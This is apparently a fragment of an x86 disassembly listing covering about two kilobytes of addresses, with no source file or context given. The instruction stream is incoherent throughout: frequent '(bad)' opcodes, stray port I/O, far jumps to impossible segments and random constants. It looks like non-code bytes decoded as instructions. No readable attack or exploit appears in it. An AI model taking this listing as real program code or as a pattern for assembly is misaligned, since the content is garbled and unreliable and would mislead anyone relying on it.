  4072e6:	xchg   ecx,eax
  4072e7:	out    dx,al
  4072e8:	mov    eax,0x228734b
  4072ed:	dec    edi
  4072ee:	sbb    dh,BYTE PTR [esi+0x40]
  4072f1:	add    eax,0x3707c5d4
  4072f6:	adc    DWORD PTR [esi-0x48512c2f],ebp
  4072fc:	pop    edx
  4072fd:	es (bad) 
  4072ff:	pop    ds
  407300:	push   es
  407301:	ss je  0x40735f
  407304:	les    eax,FWORD PTR [esi]
  407306:	mov    BYTE PTR [edi],bl
  407308:	fsubr  st,st(3)
  40730a:	push   es
  40730b:	jno    0x407368
  40730d:	pop    es
  40730e:	cmc    
  40730f:	outs   dx,BYTE PTR ds:[esi]
  407310:	add    eax,0x6747d38b
  407315:	retf   
  407316:	jne    0x4072b3
  407318:	adc    DWORD PTR [edi-0x7b],0x6950b465
  40731f:	scas   eax,DWORD PTR es:[edi]
  407320:	jecxz  0x4072d5
  407322:	pop    eax
  407323:	pop    ebp
  407324:	sbb    al,0xae
  407326:	mov    ecx,0x9a5be28d
  40732b:	(bad)  
  40732c:	sbb    al,BYTE PTR ds:0xc12f8d7f
  407332:	hlt    
  407333:	(bad)  
  407335:	jecxz  0x407313
  407337:	mov    bh,0x28
  407339:	scas   eax,DWORD PTR es:[edi]
  40733a:	pop    ds
  40733b:	fidivr WORD PTR [eax]
  40733d:	and    al,0xaf
  40733f:	pop    eax
  407340:	xchg   bx,ax
  407342:	aad    0x50
  407344:	aam    0x6b
  407346:	xchg   edx,eax
  407347:	inc    esi
  407348:	js     0x4072d9
  40734a:	out    dx,al
  40734b:	xor    DWORD PTR [edi+0x42851ca9],0xe661fcba
  407355:	dec    ebp
  407356:	pop    edi
  407357:	mov    edx,0x3f0d4444
  40735c:	out    0x95,al
  40735e:	jp     0x4072f7
  407360:	xchg   edx,eax
  407361:	ins    BYTE PTR es:[edi],dx
  407362:	rcr    BYTE PTR [esi+0x8d3dd83],0xd2
  407369:	imul   esi,DWORD PTR [ecx-0x413fa24e],0x4c9d2a8d
  407373:	cmp    eax,0xff82efe9
  407378:	nop
  407379:	pop    esp
  40737a:	or     BYTE PTR [eax+0xd],ah
  40737d:	inc    edi
  40737e:	mov    edi,0x603cf8c4
  407383:	sahf   
  407384:	mov    DWORD PTR [ebx-0x2fa9f47],0x7ca9b3ff
  40738e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40738f:	mov    bh,0x65
  407391:	neg    DWORD PTR [ecx-0x1bf56cbb]
  407397:	and    al,0xef
  407399:	enter  0x8972,0x82
  40739d:	out    dx,eax
  40739e:	cmc    
  40739f:	cmp    esp,DWORD PTR [eax-0x75f31e00]
  4073a5:	imul   esi,DWORD PTR [eax-0x6c631a0c],0x13
  4073ac:	mov    edx,0x5c37f652
  4073b1:	ins    BYTE PTR es:[edi],dx
  4073b2:	cs jl  0x40741d
  4073b5:	xchg   edi,eax
  4073b6:	jmp    0x2544:0xeafcfa4b
  4073bd:	popa   
  4073be:	or     BYTE PTR [edi],al
  4073c0:	fimul  WORD PTR [edx]
  4073c2:	test   al,0xb6
  4073c4:	les    ecx,FWORD PTR [edx]
  4073c6:	jg     0x407348
  4073c8:	pop    esi
  4073c9:	pop    esp
  4073ca:	cli    
  4073cb:	xlat   BYTE PTR ds:[ebx]
  4073cc:	in     al,dx
  4073cd:	add    bl,cl
  4073cf:	lods   al,BYTE PTR ds:[esi]
  4073d0:	out    0x33,al
  4073d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073d3:	(bad)  
  4073d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073d5:	pop    eax
  4073d6:	add    BYTE PTR [ebx-0x138ae6d],ah
  4073dc:	xchg   ebp,eax
  4073dd:	add    edx,DWORD PTR [ecx]
  4073df:	pop    ebp
  4073e0:	mov    dh,0x5d
  4073e2:	xchg   ecx,eax
  4073e3:	(bad)  
  4073e4:	sbb    ebx,ecx
  4073e6:	adc    ecx,DWORD PTR [esi+esi*2-0x7e]
  4073ea:	xor    al,0x4a
  4073ec:	retf   
  4073ed:	mov    eax,0xb0f51627
  4073f2:	(bad)  
  4073f3:	pop    ss
  4073f4:	and    DWORD PTR [ebx],ebp
  4073f6:	into   
  4073f7:	dec    ebp
  4073f8:	xchg   ebx,eax
  4073f9:	pusha  
  4073fa:	in     al,0x55
  4073fc:	in     al,dx
  4073fd:	mov    esp,0xa52aa544
  407402:	shl    DWORD PTR [ecx-0x47d10527],cl
  407408:	ins    BYTE PTR es:[edi],dx
  407409:	cli    
  40740a:	inc    edx
  40740b:	int    0xb8
  40740d:	das    
  40740e:	cdq    
  40740f:	rol    DWORD PTR [ebx],cl
  407411:	xchg   edi,eax
  407412:	mov    ds:0xf9da3f8d,al
  407417:	sbb    eax,0x18505e9b
  40741c:	mov    bh,BYTE PTR [ecx-0x3ee0cc63]
  407422:	dec    ebx
  407423:	lahf   
  407424:	pop    eax
  407425:	and    eax,0x92b7294a
  40742a:	sub    DWORD PTR [esi+0x75959f50],esp
  407430:	(bad)  
  407431:	fs sub cl,BYTE PTR es:[edi+0x1c]
  407436:	jne    0x407432
  407438:	sbb    ebp,edx
  40743a:	and    ebp,0xaad4aece
  407440:	sahf   
  407441:	cli    
  407442:	lahf   
  407443:	sbb    dh,al
  407445:	mov    ch,0xb9
  407447:	rcr    BYTE PTR [ebx-0x25],1
  40744a:	add    edi,esp
  40744c:	daa    
  40744d:	hlt    
  40744e:	loopne 0x40744b
  407450:	retf   0x11c3
  407453:	fnstenv [esi]
  407455:	fdiv   DWORD PTR [eax]
  407457:	mov    esp,0x91ab619
  40745c:	sbb    ch,al
  40745e:	push   esi
  40745f:	xchg   edi,eax
  407460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407461:	xor    DWORD PTR [ecx+0x79],esi
  407464:	(bad)  
  407465:	loop   0x40745b
  407467:	lea    ebx,[ecx+edi*1+0x5db0047e]
  40746e:	adc    eax,0x187b225f
  407473:	ss cmp cl,ch
  407476:	xchg   esp,eax
  407477:	lods   al,BYTE PTR ds:[esi]
  407478:	adc    ah,BYTE PTR es:[ebp-0x20ed207d]
  40747f:	stc    
  407480:	and    eax,DWORD PTR [esi+0x7db942ce]
  407486:	mov    eax,0x71e4c306
  40748b:	pushf  
  40748c:	mov    eax,ds:0xd93014b9
  407491:	jle    0x407457
  407493:	bound  edx,QWORD PTR [esi+ebp*1+0x7d]
  407497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407498:	and    eax,0x79505fbe
  40749d:	xor    ch,ah
  40749f:	mov    ?,ecx
  4074a1:	lods   al,BYTE PTR ds:[esi]
  4074a2:	imul   esp,ebp,0xcb86369b
  4074a8:	test   eax,0x71f827ec
  4074ad:	test   eax,0xceb2e167
  4074b2:	pusha  
  4074b3:	and    ch,cl
  4074b5:	add    BYTE PTR [edx],dl
  4074b7:	sbb    eax,0x81c84799
  4074bc:	mov    dl,0x81
  4074be:	test   DWORD PTR [ebx+0x7d],esi
  4074c1:	test   edx,0xa59ac7bc
  4074c7:	leave  
  4074c8:	sub    eax,ebp
  4074ca:	and    DWORD PTR [eax-0x5caac995],edi
  4074d0:	mov    cl,0xb5
  4074d2:	cmc    
  4074d3:	pop    edi
  4074d4:	cli    
  4074d5:	outs   dx,BYTE PTR ds:[esi]
  4074d6:	test   eax,0xd22850b6
  4074db:	or     ebp,ebx
  4074dd:	and    ah,BYTE PTR [ebx]
  4074df:	pop    esi
  4074e0:	cmp    DWORD PTR [esi+0x4d46e416],ecx
  4074e6:	pop    ss
  4074e7:	aad    0xd1
  4074e9:	and    DWORD PTR [ebx-0x36efdbe3],ecx
  4074ef:	ins    BYTE PTR es:[edi],dx
  4074f0:	jno    0x4074fa
  4074f2:	in     eax,dx
  4074f3:	sbb    eax,0x9442a9bb
  4074f8:	xor    eax,0xebd59159
  4074fd:	stc    
  4074fe:	hlt    
  4074ff:	retf   0xc419
  407502:	jmp    0xeb007326
  407507:	ins    DWORD PTR es:[edi],dx
  407508:	mov    eax,ds:0x6d97ffe2
  40750d:	stos   BYTE PTR es:[edi],al
  40750e:	xor    eax,DWORD PTR [edi]
  407510:	push   0xc86eef12
  407515:	ret    
  407516:	dec    ecx
  407517:	sub    DWORD PTR ds:0x6bec08ac,eax
  40751d:	inc    edi
  40751e:	rol    BYTE PTR [eax-0x27],cl
  407521:	mov    cl,0xa9
  407523:	dec    ebx
  407524:	arpl   WORD PTR [ecx+esi*8-0x7f3dae71],sp
  40752b:	(bad)  
  40752c:	imul   esp,DWORD PTR [eax-0x44453f5f],0xf8bae093
  407536:	(bad)  
  407537:	into   
  407538:	mov    ecx,0x66b36e60
  40753d:	nop
  40753e:	lds    ecx,FWORD PTR [ecx+eiz*2]
  407541:	scas   eax,DWORD PTR es:[edi]
  407542:	shl    BYTE PTR [ecx-0x78c262e1],0x0
  407549:	in     eax,dx
  40754a:	fcomi  st,st(3)
  40754c:	fs xchg esp,eax
  40754e:	jle    0x407536
  407550:	pop    edi
  407551:	rcr    DWORD PTR [edi],cl
  407553:	cmp    edi,DWORD PTR [ecx+0x775576fc]
  407559:	int    0x41
  40755b:	test   eax,0xd98356e0
  407560:	out    0x9,eax
  407562:	xchg   edi,eax
  407563:	dec    ebx
  407564:	popf   
  407565:	push   ecx
  407566:	data16 shr al,cl
  407569:	ror    bh,cl
  40756b:	(bad)  
  40756c:	xor    edx,DWORD PTR [ebp+0x35]
  40756f:	xchg   DWORD PTR [ecx+0x2d],esi
  407572:	and    cl,ah
  407574:	ins    DWORD PTR es:[edi],dx
  407575:	ins    BYTE PTR es:[edi],dx
  407576:	aas    
  407577:	ret    
  407578:	fisubr DWORD PTR [ebp-0x7f63f34d]
  40757e:	sbb    eax,0xfcb62e5d
  407583:	test   al,0x93
  407585:	ret    0x9019
  407588:	inc    ebx
  407589:	xchg   edx,eax
  40758a:	stc    
  40758b:	fldl2e 
  40758d:	(bad)  
  40758e:	fwait
  40758f:	dec    dx
  407591:	add    eax,0x7c8c24c8
  407596:	push   ds
  407597:	fdiv   QWORD PTR [eax+0x6d]
  40759a:	mov    esi,0x446dcefc
  40759f:	add    al,0x61
  4075a1:	test   al,0x49
  4075a3:	cmc    
  4075a4:	mov    ecx,0x383f65c3
  4075a9:	not    eax
  4075ab:	and    DWORD PTR [edi-0x7ce04354],edx
  4075b1:	or     eax,0xc94d7b49
  4075b6:	retf   0x988f
  4075b9:	mov    WORD PTR [esp+esi*1+0x35],cs
  4075bd:	lock (bad) 
  4075bf:	inc    DWORD PTR [ebx+eiz*8-0x6d]
  4075c3:	ret    0xfeb5
  4075c6:	pop    edi
  4075c7:	ficom  WORD PTR ds:0xb4fae82c
  4075ce:	stos   DWORD PTR es:[edi],eax
  4075cf:	jnp    0x4075ad
  4075d1:	in     al,0x6c
  4075d3:	pusha  
  4075d4:	jp     0x407607
  4075d6:	mov    dh,0x1f
  4075d8:	pop    esi
  4075d9:	cmp    eax,0x93a9a30f
  4075de:	push   esp
  4075df:	adc    eax,0x5eca6341
  4075e4:	shr    DWORD PTR [esi-0x49],1
  4075e7:	mov    bh,0x5c
  4075e9:	dec    esp
  4075ea:	sbb    eax,0x1cdbe88b
  4075ef:	adc    BYTE PTR [edx+eax*1-0x28f53c22],bh
  4075f6:	sbb    DWORD PTR ds:0x1cc67d08,ebp
  4075fc:	cli    
  4075fd:	inc    ebx
  4075fe:	mov    edi,0x3c5686da
  407603:	jmp    0x8797:0x53735696
  40760a:	jae    0x4075b9
  40760c:	add    eax,0xc9a6228f
  407611:	fwait
  407612:	jne    0x407615
  407614:	dec    eax
  407615:	jb     0x4075d4
  407617:	ss xor edx,edx
  40761a:	js     0x407634
  40761c:	iret   
  40761d:	loope  0x407636
  40761f:	hlt    
  407620:	shr    BYTE PTR [esi+0x39e87848],cl
  407626:	lock bound ebx,QWORD PTR [ebp-0x2a9b7690]
  40762d:	mov    dl,0x1c
  40762f:	ja     0x407601
  407631:	dec    esi
  407632:	psubusb mm5,QWORD PTR [esi-0x38]
  407636:	xor    dh,ch
  407638:	add    DWORD PTR [ebx+0x19],0x45
  40763c:	leave  
  40763d:	in     eax,dx
  40763e:	div    DWORD PTR [ebx+0x65ed2413]
  407644:	xchg   ebp,eax
  407645:	test   DWORD PTR [edx],0x85f05adf
  40764b:	movaps xmm7,XMMWORD PTR [ebp-0x2c]
  40764f:	std    
  407650:	je     0x40764f
  407652:	aaa    
  407653:	rol    BYTE PTR [ebp+0x28e6821e],0xfd
  40765a:	fstp   DWORD PTR [ebx+0x68]
  40765d:	or     al,0x53
  40765f:	cwde   
  407660:	enter  0x6e64,0xb9
  407664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407665:	jg     0x407600
  407667:	in     al,0x43
  407669:	pop    ds
  40766a:	sbb    dl,BYTE PTR [edx+0x20]
  40766d:	dec    esp
  40766e:	sbb    dh,bh
  407670:	gs repz popa 
  407673:	(bad)  
  407674:	(bad)  
  407675:	aas    
  407676:	dec    ecx
  407677:	mov    ecx,0xec23ba5e
  40767c:	push   ss
  40767d:	fwait
  40767e:	ret    0xcfc9
  407681:	stc    
  407682:	lods   eax,DWORD PTR ds:[esi]
  407683:	or     eax,0x54b28d2b
  407688:	loope  0x40767d
  40768a:	inc    esp
  40768b:	test   eax,0xaf0e1c95
  407690:	and    eax,0xec209ec3
  407695:	daa    
  407696:	pop    esp
  407697:	pop    edx
  407698:	sbb    BYTE PTR [esi-0x495cf836],bh
  40769e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40769f:	fnstsw WORD PTR ds:0x9434b00a
  4076a5:	inc    ebx
  4076a6:	jno    0x40764a
  4076a8:	jmp    0xf0ec:0x839dc454
  4076af:	push   esp
  4076b0:	cmp    DWORD PTR [edi-0x6cf93cdb],eax
  4076b6:	xchg   edi,eax
  4076b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076b8:	inc    edx
  4076b9:	jge    0x4076cd
  4076bb:	xor    BYTE PTR [eax-0x7cfa3333],al
  4076c1:	jno    0x4076a0
  4076c3:	pushf  
  4076c4:	and    dl,al
  4076c6:	(bad)  
  4076c7:	and    esp,DWORD PTR [edi]
  4076c9:	(bad)  
  4076ca:	jmp    0xb82e:0xa27ad3ec
  4076d1:	test   eax,0x82ddaa66
  4076d6:	rcl    BYTE PTR [edx],1
  4076d8:	or     DWORD PTR [ebx-0x10984c41],eax
  4076de:	pop    ebx
  4076df:	sub    ch,dl
  4076e1:	cmp    DWORD PTR [edx],eax
  4076e3:	ret    0x318e
  4076e6:	or     eax,0xc10a3fc5
  4076eb:	rcr    BYTE PTR [esi+0x3f084528],0x26
  4076f2:	je     0x4076ea
  4076f4:	inc    esp
  4076f5:	add    al,0x1a
  4076f7:	shl    DWORD PTR [edx+0x11],0x67
  4076fb:	popa   
  4076fc:	ficom  WORD PTR [eax-0x1d]
  4076ff:	enter  0xf3ce,0xd3
  407703:	push   esi
  407704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407705:	int3   
  407706:	push   edx
  407707:	mov    cl,0xdc
  407709:	cli    
  40770a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40770b:	add    al,0x47
  40770d:	dec    ebp
  40770e:	fisubr WORD PTR [ebx-0x5e310136]
  407714:	jmp    0x4027:0x5ff7ca9d
  40771b:	outs   dx,BYTE PTR ds:[esi]
  40771c:	mov    DWORD PTR [ecx],ecx
  40771e:	inc    al
  407720:	ds sub eax,0xf15bdac5
  407726:	es jge 0x407746
  407729:	xchg   esp,eax
  40772a:	clc    
  40772b:	ret    0x9197
  40772e:	cdq    
  40772f:	shl    BYTE PTR [ebx+0x49],cl
  407732:	push   0x728fe8d
  407737:	inc    esi
  407738:	fst    QWORD PTR [ecx]
  40773a:	and    esi,esp
  40773c:	lods   al,BYTE PTR ds:[esi]
  40773d:	ins    DWORD PTR es:[edi],dx
  40773e:	ret    
  40773f:	jl     0x4076fd
  407741:	stos   DWORD PTR es:[edi],eax
  407742:	xchg   edi,eax
  407743:	pop    esi
  407744:	scas   al,BYTE PTR es:[edi]
  407745:	adc    edx,DWORD PTR [esi+0x69ec085b]
  40774b:	dec    esp
  40774c:	lock je 0x407704
  40774f:	sbb    edx,esi
  407751:	fwait
  407752:	int3   
  407753:	xor    al,0xa8
  407755:	mov    ch,0x69
  407757:	outs   dx,DWORD PTR ds:[esi]
  407758:	enter  0x99ff,0xa7
  40775c:	mov    ds:0x6aad877d,eax
  407761:	hlt    
  407762:	jecxz  0x407793
  407764:	push   esi
  407765:	ret    
  407766:	addr16 out 0x81,al
  407769:	xor    edx,ebp
  40776b:	jb     0x407726
  40776d:	cmc    
  40776e:	push   ds
  40776f:	clc    
  407770:	mov    eax,ds:0xc6417267
  407775:	lock rcl ah,1
  407778:	xchg   edx,eax
  407779:	cmp    eax,0xc5511cb9
  40777e:	in     al,0xca
  407780:	mov    dh,0xec
  407782:	(bad)  
  407784:	mov    esp,0x4f0dc498
  407789:	int3   
  40778a:	sbb    DWORD PTR ds:0xa6b21f85,ebx
  407790:	mov    BYTE PTR [edx+0x75],bl
  407793:	mov    ebp,0xffdee5f6
  407798:	sbb    eax,0x6ee43a81
  40779d:	xchg   esi,eax
  40779e:	mov    ebp,0x67220497
  4077a3:	jle    0x407805
  4077a5:	dec    esp
  4077a6:	xor    BYTE PTR [edi],0xef
  4077a9:	push   es
  4077aa:	lds    ecx,FWORD PTR [edi-0x2b]
  4077ad:	jmp    0x363f:0xde05f54e
  4077b4:	and    eax,0xf884d51
  4077b9:	test   DWORD PTR [ecx+0x2],0x7127ff71
  4077c0:	jecxz  0x40779e
  4077c2:	pop    eax
  4077c3:	cmp    ebx,DWORD PTR [ecx+0x7e1149b7]
  4077c9:	out    0xf9,al
  4077cb:	sbb    dl,bh
  4077cd:	mov    esi,0xcfe5f190
  4077d2:	pop    edi
  4077d3:	xchg   DWORD PTR [ebx+0x4c],esi
  4077d6:	xchg   ebx,eax
  4077d7:	or     BYTE PTR [ecx-0x5740bfbd],ah
  4077dd:	xor    eax,0x2c9467aa
  4077e2:	fninit 
  4077e4:	rcr    DWORD PTR [edx-0x7f9e69b7],cl
  4077ea:	sub    bl,BYTE PTR [esi-0x7b]
  4077ed:	push   0x7b
  4077ef:	or     DWORD PTR [edx-0x5a],edi
  4077f2:	dec    edx
  4077f3:	inc    edx
  4077f4:	push   ebx
  4077f5:	add    al,0xd4
  4077f7:	dec    esp
  4077f8:	push   edi
  4077f9:	popa   
  4077fa:	loop   0x40783f
  4077fc:	pop    eax
  4077fd:	push   eax
  4077fe:	and    ah,BYTE PTR [ebx]
  407800:	jp     0x407800
  407802:	push   edi
  407803:	jbe    0x8bd20385
  407809:	mov    esi,0x45fc7bed
  40780e:	sbb    eax,0x6d85c92f
  407813:	mov    ch,0x45
  407815:	adc    DWORD PTR [eax],0xc0374128
  40781b:	mov    ebx,0xc1b53660
  407820:	leave  
  407821:	pop    ebx
  407822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407823:	jnp    0x4077a9
  407825:	call   0xe906d6ca
  40782a:	jno    0x4077cb
  40782c:	mov    ebp,0xd3719f89
  407831:	aaa    
  407832:	mov    al,ds:0xf7eaf963
  407837:	and    al,0x30
  407839:	enter  0x2f79,0x4c
  40783d:	repz xor DWORD PTR [eax+0x42c1fb97],ebp
  407844:	sti    
  407845:	push   eax
  407846:	mov    ch,0xb5
  407848:	shr    BYTE PTR [edx+ecx*4+0x22ef8b92],1
  40784f:	pop    edi
  407850:	aad    0x45
  407852:	fdivr  st,st(0)
  407854:	call   0x6c9d:0x48a413eb
  40785b:	add    DWORD PTR [esp+ebx*1],edi
  40785e:	cli    
  40785f:	test   al,0x36
  407861:	aas    
  407862:	cld    
  407863:	int    0xb7
  407865:	clc    
  407866:	sub    DWORD PTR [ecx+eax*1+0x18],edi
  40786a:	iret   
  40786b:	adc    DWORD PTR [ebx+ecx*8],0xd
  40786f:	test   al,0xd3
  407871:	sahf   
  407872:	cwde   
  407873:	jb     0x407842
  407875:	repz mov dh,0xb6
  407878:	lods   al,BYTE PTR ds:[esi]
  407879:	lock mov eax,0x83de676f
  40787f:	sub    al,0x61
  407881:	fstp   DWORD PTR [edi-0x2f]
  407884:	fcomp  DWORD PTR [edi-0x29]
  407887:	lahf   
  407888:	mov    ebx,0xcd40d471
  40788d:	sub    ecx,DWORD PTR [esi+0x7b910f95]
  407893:	leave  
  407894:	or     eax,0x963742c2
  407899:	mov    edi,0xec2f9f4e
  40789e:	call   0xec33ef51
  4078a3:	je     0x407861
  4078a5:	out    0x8a,eax
  4078a7:	sub    ch,0xe4
  4078aa:	dec    ebx
  4078ab:	ja     0x40787c
  4078ad:	pop    edi
  4078ae:	dec    edi
  4078af:	fidivr DWORD PTR [edx+0x6d]
  4078b2:	cmp    di,WORD PTR [edx]
  4078b5:	jmp    0x4003423c
  4078ba:	jle    0x40786a
  4078bc:	(bad)
  4078bf:	(bad)  
  4078c0:	call   0x57d742bd
  4078c5:	mov    ?,WORD PTR [ecx]
  4078c7:	pop    ecx
  4078c8:	inc    esi
  4078c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078ca:	or     al,0x90
  4078cc:	cmc    
  4078cd:	add    DWORD PTR [eax],ebx
  4078cf:	add    eax,0x34fd67f3
  4078d4:	pushf  
  4078d5:	jl     0x407868
  4078d7:	clc    
  4078d8:	xchg   edx,eax
  4078d9:	lea    esi,[edx+0x7b7d04d3]
  4078df:	imul   edx,DWORD PTR [ecx+0x1852b53b],0x9cebfc7e
  4078e9:	xchg   esp,eax
  4078ea:	mov    cl,0x23
  4078ec:	or     esi,ecx
  4078ee:	das    
  4078ef:	push   edi
  4078f0:	jle    0x407961
  4078f2:	xlat   BYTE PTR ds:[ebx]
  4078f3:	mov    ecx,0x5e29a895
  4078f8:	rcr    BYTE PTR [eax-0x3038b298],0x85
  4078ff:	(bad)  
  407900:	ss loope 0x407968
  407903:	aaa    
  407904:	and    BYTE PTR [ecx-0x10],al
  407907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407908:	das    
  407909:	repz sbb DWORD PTR [edx-0x6ce5bb17],esp
  407910:	lds    esi,FWORD PTR [eax-0x7ce109ab]
  407916:	call   0x7ccd57a9
  40791b:	push   esi
  40791c:	dec    eax
  40791d:	jle    0x4078bc
  40791f:	imul   ebx,DWORD PTR [esi+ebp*8],0xc00798d2
  407926:	mov    al,0x7b
  407928:	or     DWORD PTR [edi+0x1579286e],0x61
  40792f:	push   es
  407930:	jp     0x407967
  407932:	xor    DWORD PTR [ebx+0x47],eax
  407935:	mov    dl,0x89
  407937:	stos   DWORD PTR es:[edi],eax
  407938:	push   esp
  407939:	popf   
  40793a:	retf   
  40793b:	xor    DWORD PTR [eax],ebx
  40793d:	call   0xad32:0xd9ecac52
  407944:	xor    eax,0xa3b24b6d
  407949:	mov    ds:0xf3530b8e,al
  40794e:	push   ebp
  40794f:	imul   esi,DWORD PTR [ebx],0x27
  407952:	sbb    eax,0x7924b34c
  407957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407958:	test   edx,esi
  40795a:	out    0xcf,eax
  40795c:	mov    ah,0xb7
  40795e:	inc    edi
  40795f:	sbb    DWORD PTR [ecx-0x6abd65ab],eax
  407965:	sub    eax,0x1046d30e
  40796a:	mov    BYTE PTR [edi+ebx*2+0x3e],ch
  40796e:	mov    bh,0x22
  407970:	ss (bad) 
  407972:	dec    edi
  407973:	fsub   DWORD PTR [ebp+0x4d7cf154]
  407979:	xlat   BYTE PTR ds:[ebx]
  40797a:	cvttps2pi mm3,xmm4
  40797d:	cmc    
  40797e:	pop    esi
  40797f:	xchg   ecx,eax
  407980:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407982:	xchg   esi,eax
  407983:	pop    ebx
  407984:	or     bl,bl
  407986:	sub    al,0x3d
  407988:	shl    BYTE PTR ds:0xb9ab41a,0xeb
  40798f:	rol    BYTE PTR [esi],cl
  407991:	mov    ds,WORD PTR [esi]
  407993:	jnp    0x4079f3
  407995:	outs   dx,DWORD PTR ds:[esi]
  407996:	xchg   edx,eax
  407997:	pop    edx
  407998:	mov    ecx,DWORD PTR [esp+ebp*8-0x50]
  40799c:	xlat   BYTE PTR ds:[ebx]
  40799d:	lods   eax,DWORD PTR ds:[esi]
  40799e:	pop    ecx
  40799f:	pop    ebp
  4079a0:	pop    edx
  4079a1:	ss pop esp
  4079a3:	iret   
  4079a4:	rol    BYTE PTR [esi],0xd4
  4079a7:	jo     0x4079f0
  4079a9:	push   ebx
  4079aa:	sbb    eax,0xf0370503
  4079af:	retf   
  4079b0:	cmc    
  4079b1:	sub    ah,0x31
  4079b4:	sar    BYTE PTR [eax-0x66],cl
  4079b7:	stos   DWORD PTR es:[edi],eax
  4079b8:	jo     0x3f84122f
  4079be:	inc    eax
  4079bf:	jl     0x407a31
  4079c1:	jmp    FWORD PTR [ecx*8+0x41d4c529]
  4079c8:	imul   ebp,DWORD PTR [edi+0x7b],0x6074a48a
  4079cf:	xor    DWORD PTR [ebp-0x3108e953],edx
  4079d5:	adc    BYTE PTR [eax+0x75],ah
  4079d8:	xchg   edx,eax
  4079d9:	pop    bp
  4079db:	push   esi
  4079dc:	enter  0xd380,0x60
  4079e0:	clc    
  4079e1:	(bad)  
  4079e2:	pusha  
  4079e3:	ins    BYTE PTR es:[edi],dx
  4079e4:	(bad)  
  4079e5:	loopne 0x407a0a
  4079e7:	sub    edi,DWORD PTR [ebx+0x25]
  4079ea:	mov    BYTE PTR [eax],ah
  4079ec:	scas   eax,DWORD PTR es:[edi]
  4079ed:	nop
  4079ee:	xchg   ebp,eax
  4079ef:	xchg   ecx,eax
  4079f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079f1:	mov    ds:0xa0d07f10,eax
  4079f6:	arpl   WORD PTR [esi-0x534c16fa],di
  4079fc:	ja     0x407a42
  4079fe:	jb     0x4079a3
  407a00:	and    DWORD PTR [ecx+0x2f982015],esp
  407a06:	sar    BYTE PTR [eax+0x15691fe5],cl
  407a0c:	lods   eax,DWORD PTR ds:[esi]
  407a0d:	in     eax,0x98
  407a0f:	btr    DWORD PTR [esi],eax
  407a12:	and    DWORD PTR [edx],0x31
  407a15:	xchg   ebp,eax
  407a16:	aad    0x9b
  407a18:	xor    al,0x72
  407a1a:	add    ebp,DWORD PTR [esi]
  407a1c:	push   0x8f7a9ac7
  407a21:	ds repz addr16 mov bl,0xb3
  407a26:	sbb    DWORD PTR [eax-0x35],esi
  407a29:	(bad)  
  407a2a:	jmp    0x407a23
  407a2c:	loopne 0x407a33
  407a2e:	stos   BYTE PTR es:[edi],al
  407a2f:	push   0x34
  407a31:	xchg   ecx,eax
  407a32:	loope  0x4079ef
  407a34:	push   edx
  407a35:	in     al,dx
  407a36:	cli    
  407a37:	mov    esi,0x3acfa857
  407a3c:	int3   
  407a3d:	xor    cl,BYTE PTR [ebp+0x56f59fe0]
  407a43:	mov    cl,0xda
  407a45:	inc    esi
  407a46:	jecxz  0x407a68
  407a48:	inc    eax
  407a49:	test   al,0x1a
  407a4b:	sbb    BYTE PTR [esi+0x1e],ah
  407a4e:	sbb    DWORD PTR [ebx-0x164ae9f0],ecx
  407a54:	pop    es
  407a55:	mov    es,WORD PTR [esp+edx*4]
  407a58:	inc    ecx
  407a59:	mul    DWORD PTR [edx+edi*2-0x11]
  407a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a5e:	push   esp
  407a5f:	retf   0x7830
  407a62:	(bad)  
  407a64:	inc    edx
  407a65:	sub    eax,DWORD PTR [eax]
  407a67:	mov    ebp,0x333caffd
  407a6c:	xchg   esi,eax
  407a6d:	loope  0x407a4f
  407a6f:	jns    0x407aad
  407a71:	pop    ebp
  407a72:	dec    DWORD PTR [ebx+0x2a61c914]
  407a78:	push   ebp
  407a79:	or     eax,0x33f202dc
  407a7e:	fwait
  407a7f:	arpl   WORD PTR [ecx-0x61],sp
  407a82:	push   ebp
  407a83:	test   BYTE PTR [esi+0x44],bh
  407a86:	jns    0x407ad9
  407a88:	sub    DWORD PTR [eax],edi
  407a8a:	mov    edi,0x1f240e95
  407a8f:	out    0xdd,eax
  407a91:	xor    DWORD PTR [ecx+eiz*8],esi
  407a94:	pop    edx
  407a95:	adc    edx,DWORD PTR [edx-0x5aea0b32]
  407a9b:	icebp  
  407a9c:	in     eax,0x14
  407a9e:	imul   esi,DWORD PTR [eax-0x6d],0x6ded4b8f
  407aa5:	cmc    
  407aa6:	fsub   QWORD PTR [edx+0x296ad7be]
  407aac:	inc    ebx
  407aad:	push   eax
  407aae:	push   es
  407aaf:	mov    eax,ds:0xf7772013
  407ab4:	mov    edi,DWORD PTR fs:[eax]
  407ab7:	push   0xe01d9286
  407abc:	fild   QWORD PTR [ebx+esi*8-0x57ab696c]
  407ac3:	clc    
  407ac4:	or     DWORD PTR [ecx+0x79cde060],eax
  407aca:	inc    ebx
  407acb:	xchg   edi,eax
  407acc:	xchg   esp,eax
  407acd:	enter  0xa5f6,0xd8
  407ad1:	mov    dl,0x5d
  407ad3:	dec    eax
  407ad4:	data16 and BYTE PTR [esi],bh
  407ad7:	inc    edi
  407ad8:	xlat   BYTE PTR ds:[ebx]
  407ad9:	out    dx,eax
  407ada:	aas    
  407adb:	mov    eax,ds:0xc52ecd35
  407ae0:	fst    DWORD PTR [ecx+0x1a]
  407ae3:	mov    cl,0x9
  407ae5:	cmp    ecx,DWORD PTR [esi+ecx*2]
  407ae8:	xchg   esp,eax
  407ae9:	xor    edi,DWORD PTR [esi]
  407aeb:	std    
  407aec:	or     al,0xbd
